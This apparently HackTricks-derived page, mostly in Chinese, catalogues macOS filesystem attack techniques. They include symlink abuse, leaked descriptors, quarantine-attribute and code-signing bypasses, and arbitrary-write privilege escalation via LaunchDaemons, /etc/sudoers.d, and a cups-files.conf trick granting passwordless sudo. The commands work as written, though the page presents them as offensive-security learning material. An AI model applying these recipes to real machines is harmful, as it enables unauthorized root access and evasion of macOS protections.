# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX 权限组合

**目录**中的权限：

- **读取** - 你可以 **枚举** 目录条目
- **写入** - 你可以 **删除/写入** 目录中的 **文件**，并且你可以 **删除空文件夹**。
- 但你 **不能删除/修改非空文件夹**，除非你对其拥有写入权限。
- 你 **不能修改文件夹的名称**，除非你拥有它。
- **执行** - 你被 **允许遍历** 目录 - 如果你没有这个权限，你无法访问其中的任何文件或任何子目录。

### 危险组合

**如何覆盖由 root 拥有的文件/文件夹**，但：

- 路径中的一个父 **目录所有者** 是用户
- 路径中的一个父 **目录所有者** 是具有 **写入访问权限** 的 **用户组**
- 一个用户 **组** 对 **文件** 具有 **写入** 访问权限

在任何上述组合中，攻击者可以 **注入** 一个 **符号/硬链接** 到预期路径，以获得特权的任意写入。

### 文件夹 root R+X 特殊情况

如果在一个 **目录** 中有文件，**只有 root 拥有 R+X 访问权限**，那么这些文件对 **其他任何人** 都是 **不可访问的**。因此，允许 **将用户可读的文件** 从此文件夹 **移动到另一个文件夹** 的漏洞，可能会被滥用以读取这些文件。

示例在：[https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## 符号链接 / 硬链接

### 宽松的文件/文件夹

如果一个特权进程正在写入一个 **文件**，该文件可能被 **低特权用户控制**，或者可能是 **之前由低特权用户创建**。用户可以通过符号链接或硬链接 **指向另一个文件**，特权进程将会在该文件上写入。

查看其他部分，攻击者可能会 **滥用任意写入以提升特权**。

### 打开 `O_NOFOLLOW`

当 `open` 函数使用标志 `O_NOFOLLOW` 时，它不会在最后路径组件中跟随符号链接，但会跟随路径的其余部分。防止在路径中跟随符号链接的正确方法是使用标志 `O_NOFOLLOW_ANY`。

## .fileloc

具有 **`.fileloc`** 扩展名的文件可以指向其他应用程序或二进制文件，因此当它们被打开时，执行的将是该应用程序/二进制文件。\
示例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 文件描述符

### 泄漏 FD (没有 `O_CLOEXEC`)

如果调用 `open` 时没有标志 `O_CLOEXEC`，文件描述符将被子进程继承。因此，如果一个特权进程打开一个特权文件并执行一个由攻击者控制的进程，攻击者将 **继承对特权文件的 FD**。

如果你能让一个 **进程以高权限打开一个文件或文件夹**，你可以利用 **`crontab`** 在 `/etc/sudoers.d` 中打开一个文件，使用 **`EDITOR=exploit.py`**，这样 `exploit.py` 将获得对 `/etc/sudoers` 中文件的 FD 并加以利用。

例如: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)，代码: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## 避免隔离 xattrs 技巧

### 移除它
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable 标志

如果一个文件/文件夹具有此不可变属性，则无法在其上设置 xattr。
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

一个 **devfs** 挂载 **不支持 xattr**，更多信息请参见 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

此 ACL 防止向文件添加 `xattrs`
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 文件格式复制一个文件及其 ACE。

在 [**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) 中可以看到，存储在名为 **`com.apple.acl.text`** 的 xattr 中的 ACL 文本表示将被设置为解压缩文件中的 ACL。因此，如果你将一个应用程序压缩成一个带有 ACL 的 **AppleDouble** 文件格式的 zip 文件，该 ACL 阻止其他 xattrs 被写入... 那么隔离 xattr 并没有被设置到应用程序中：

查看 [**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) 以获取更多信息。

要复制这一点，我们首先需要获取正确的 acl 字符串：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Not really needed but I leave it there just in case:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## 绕过签名检查

### 绕过平台二进制检查

一些安全检查会检查二进制文件是否为 **平台二进制**，例如允许连接到 XPC 服务。然而，如在 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ 中所述，可以通过获取一个平台二进制（如 /bin/ls）并通过 dyld 使用环境变量 `DYLD_INSERT_LIBRARIES` 注入漏洞来绕过此检查。

### 绕过标志 `CS_REQUIRE_LV` 和 `CS_FORCED_LV`

执行中的二进制文件可以修改其自身的标志，以通过如下代码绕过检查：
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## 绕过代码签名

Bundles 包含文件 **`_CodeSignature/CodeResources`**，该文件包含 **bundle** 中每个 **file** 的 **hash**。请注意，CodeResources 的 hash 也 **嵌入在可执行文件中**，因此我们也不能对其进行修改。

然而，有一些文件的签名不会被检查，这些文件在 plist 中具有 omit 键，例如：
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
可以通过命令行计算资源的签名，方法是：
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

用户可以挂载一个自定义的 dmg，即使是在某些现有文件夹上。这就是您如何创建一个包含自定义内容的自定义 dmg 包：
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
通常，macOS 通过与 `com.apple.DiskArbitrarion.diskarbitrariond` Mach 服务（由 `/usr/libexec/diskarbitrationd` 提供）进行通信来挂载磁盘。如果在 LaunchDaemons plist 文件中添加参数 `-d` 并重启，它将把日志存储在 `/var/log/diskarbitrationd.log` 中。\
然而，可以使用像 `hdik` 和 `hdiutil` 这样的工具直接与 `com.apple.driver.DiskImages` kext 进行通信。

## 任意写入

### 定期 sh 脚本

如果您的脚本可以被解释为 **shell 脚本**，您可以覆盖 **`/etc/periodic/daily/999.local`** shell 脚本，该脚本将每天触发。

您可以通过以下方式 **伪造** 此脚本的执行：**`sudo periodic daily`**

### 守护进程

编写一个任意的 **LaunchDaemon**，例如 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**，其中 plist 执行一个任意脚本，如：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
生成脚本 `/Applications/Scripts/privesc.sh`，其中包含您希望以 root 身份运行的 **命令**。

### Sudoers 文件

如果您具有 **任意写入** 权限，您可以在 **`/etc/sudoers.d/`** 文件夹中创建一个文件，授予自己 **sudo** 权限。

### PATH 文件

文件 **`/etc/paths`** 是填充 PATH 环境变量的主要位置之一。您必须是 root 才能覆盖它，但如果 **特权进程** 执行某些 **命令而没有完整路径**，您可能能够通过修改此文件来 **劫持** 它。

您还可以在 **`/etc/paths.d`** 中写入文件，以将新文件夹加载到 `PATH` 环境变量中。

### cups-files.conf

此技术在 [this writeup](https://www.kandji.io/blog/macos-audit-story-part1) 中使用。

创建文件 `/etc/cups/cups-files.conf`，内容如下：
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
这将创建文件 `/etc/sudoers.d/lpe`，权限为 777。末尾的额外垃圾是为了触发错误日志的创建。

然后，在 `/etc/sudoers.d/lpe` 中写入所需的配置以提升权限，如 `%staff ALL=(ALL) NOPASSWD:ALL`。

然后，再次修改文件 `/etc/cups/cups-files.conf`，指示 `LogFilePerm 700`，以便新的 sudoers 文件在调用 `cupsctl` 时变得有效。

### 沙盒逃逸

可以通过 FS 任意写入来逃逸 macOS 沙盒。有关一些示例，请查看页面 [macOS Auto Start](../../../../macos-auto-start-locations.md)，但一个常见的例子是在 `~/Library/Preferences/com.apple.Terminal.plist` 中写入一个终端首选项文件，该文件在启动时执行一个命令，并使用 `open` 调用它。

## 生成其他用户可写的文件

这将生成一个属于 root 的文件，我可以写入（[**代码来自这里**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)）。这也可能作为权限提升的手段：
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX 共享内存

**POSIX 共享内存** 允许在 POSIX 兼容操作系统中的进程访问一个公共内存区域，与其他进程间通信方法相比，促进了更快的通信。它涉及使用 `shm_open()` 创建或打开一个共享内存对象，使用 `ftruncate()` 设置其大小，并使用 `mmap()` 将其映射到进程的地址空间。进程可以直接从这个内存区域读取和写入。为了管理并发访问并防止数据损坏，通常使用互斥锁或信号量等同步机制。最后，进程使用 `munmap()` 和 `close()` 解除映射并关闭共享内存，并可选择使用 `shm_unlink()` 删除内存对象。该系统在多个进程需要快速访问共享数据的环境中，尤其有效于高效、快速的 IPC。

<details>

<summary>生产者代码示例</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>消费者代码示例</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS 受保护描述符

**macOS 受保护描述符** 是在 macOS 中引入的一项安全功能，旨在增强用户应用程序中 **文件描述符操作** 的安全性和可靠性。这些受保护的描述符提供了一种将特定限制或“保护”与文件描述符关联的方法，这些限制由内核强制执行。

此功能特别有助于防止某些类别的安全漏洞，例如 **未经授权的文件访问** 或 **竞争条件**。这些漏洞发生在例如一个线程正在访问一个文件描述符，导致 **另一个脆弱线程对其的访问**，或者当一个文件描述符被 **继承** 给一个脆弱的子进程时。与此功能相关的一些函数包括：

- `guarded_open_np`: 以保护方式打开文件描述符
- `guarded_close_np`: 关闭它
- `change_fdguard_np`: 更改描述符上的保护标志（甚至移除保护）

## 参考

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
